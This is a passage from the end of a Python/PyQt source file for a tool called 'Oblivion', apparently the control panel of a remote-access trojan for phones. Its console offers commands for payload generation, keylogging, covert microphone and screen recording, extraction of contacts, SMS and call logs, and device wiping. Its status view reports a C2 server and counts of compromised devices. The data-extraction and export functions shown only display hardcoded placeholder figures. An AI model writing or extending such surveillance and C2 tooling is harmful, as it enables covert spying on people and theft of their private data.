    def extract_all_data(self):
        if self.selected_device:
            self.log("💀 Extracting ALL data...")
            self.data_table.insertRow(0)
            self.data_table.setItem(0, 0, QTableWidgetItem("CONTACTS"))
            self.data_table.setItem(0, 1, QTableWidgetItem("847 entries"))
            self.data_table.setItem(0, 2, QTableWidgetItem("45 KB"))
            self.data_table.setItem(0, 3, QTableWidgetItem(datetime.now().strftime("%H:%M:%S")))
            
            self.data_table.insertRow(1)
            self.data_table.setItem(1, 0, QTableWidgetItem("SMS"))
            self.data_table.setItem(1, 1, QTableWidgetItem("2,341 messages"))
            self.data_table.setItem(1, 2, QTableWidgetItem("120 KB"))
            self.data_table.setItem(1, 3, QTableWidgetItem(datetime.now().strftime("%H:%M:%S")))
            
            self.data_table.insertRow(2)
            self.data_table.setItem(2, 0, QTableWidgetItem("CALLS"))
            self.data_table.setItem(2, 1, QTableWidgetItem("345 logs"))
            self.data_table.setItem(2, 2, QTableWidgetItem("23 KB"))
            self.data_table.setItem(2, 3, QTableWidgetItem(datetime.now().strftime("%H:%M:%S")))
            
            self.stats['data'].setText("45 MB")
            self.log("✅ ALL DATA EXTRACTED!")
        else:
            QMessageBox.warning(self, "Error", "Select a device first!")
    
    def export_data(self):
        self.log("📤 Exporting data...")
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"oblivion_export_{timestamp}.json"
        self.log(f"✅ Data exported to: {filename}")
    
    def display_data(self, data_type, data):
        dialog = QDialog(self)
        dialog.setWindowTitle(f"{data_type} Data")
        dialog.setGeometry(200, 200, 600, 400)
        text_edit = QTextEdit(dialog)
        text_edit.setPlainText(data)
        text_edit.setStyleSheet("background-color: #1a1a2e; color: #00ff41;")
        layout = QVBoxLayout()
        layout.addWidget(text_edit)
        dialog.setLayout(layout)
        dialog.exec_()
    
    # ============================================
    # CONSOLE FUNCTIONS
    # ============================================
    
    def run_command(self):
        command = self.cmd_input.text()
        if not command:
            return
        
        self.log(f"⚡ EXECUTING: {command}")
        self.console.append(f"\n> {command}")
        
        if command == "help":
            self.console.append("""
Available commands:
  scan        - Scan for devices
  payload     - Generate payload
  screenshot  - Take screenshot
  record      - Start screen recording
  stoprecord  - Stop screen recording
  mic         - Start microphone
  stopmic     - Stop microphone
  keylog      - Start keylogger
  stopkeylog  - Stop keylogger
  extract     - Extract all data
  wipe        - Wipe device
  reboot      - Reboot device
  engine      - Execute C++ Core Engine
  status      - Show status
  clear       - Clear console
            """)
        elif command == "scan":
            self.scan_devices()
        elif command == "payload":
            self.generate_payload()
        elif command == "screenshot":
            self.take_screenshot()
        elif command == "record":
            self.toggle_screen_record()
        elif command == "stoprecord":
            self.toggle_screen_record()
        elif command == "mic":
            self.toggle_mic()
        elif command == "stopmic":
            self.toggle_mic()
        elif command == "keylog":
            self.toggle_keylogger()
        elif command == "stopkeylog":
            self.toggle_keylogger()
        elif command == "extract":
            self.extract_all_data()
        elif command == "wipe":
            self.wipe_device()
        elif command == "reboot":
            self.reboot_device()
        elif command == "engine":
            self.execute_core_engine()
        elif command == "status":
            self.console.append(f"""
Current Status:
  C2 Server: {YOUR_IP}:{C2_PORT} ✅ RUNNING
  Devices: {len(self.devices)}
  Selected: {self.selected_device or 'None'}
  Compromised: {self.stats['compromised'].text()}
  Data: {self.stats['data'].text()}
  Payload: {'Ready' if self.payload_file else 'None'}
  Mic Recording: {'Active' if self.is_mic_recording else 'Idle'}
  Screen Recording: {'Active' if self.is_recording else 'Idle'}
  Keylogger: {'Active' if self.is_keylogger else 'Idle'}
            """)
        elif command == "clear":
            self.console.clear()
        else:
            self.console.append(f"❌ Unknown command: {command}")
        
        self.cmd_input.clear()

# ============================================
# RUN
# ============================================

if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setStyle('Fusion')
    
    palette = QPalette()
    palette.setColor(QPalette.Window, QColor(10, 14, 23))
    palette.setColor(QPalette.WindowText, QColor(0, 255, 65))
    app.setPalette(palette)
    
    # Check if IP is configured
    if YOUR_IP == "0.0.0.0":
        print("=" * 60)
        print("⚠️ WARNING: YOUR_IP NOT CONFIGURED!")
        print("=" * 60)
        print("Please edit config.py and set YOUR_IP = 'your_public_ip'")
        print("Find your IP: curl ifconfig.me")
        print("=" * 60)
        print("Continuing with default settings...")
    
    window = OblivionMainWindow()
    window.show()
    
    sys.exit(app.exec_())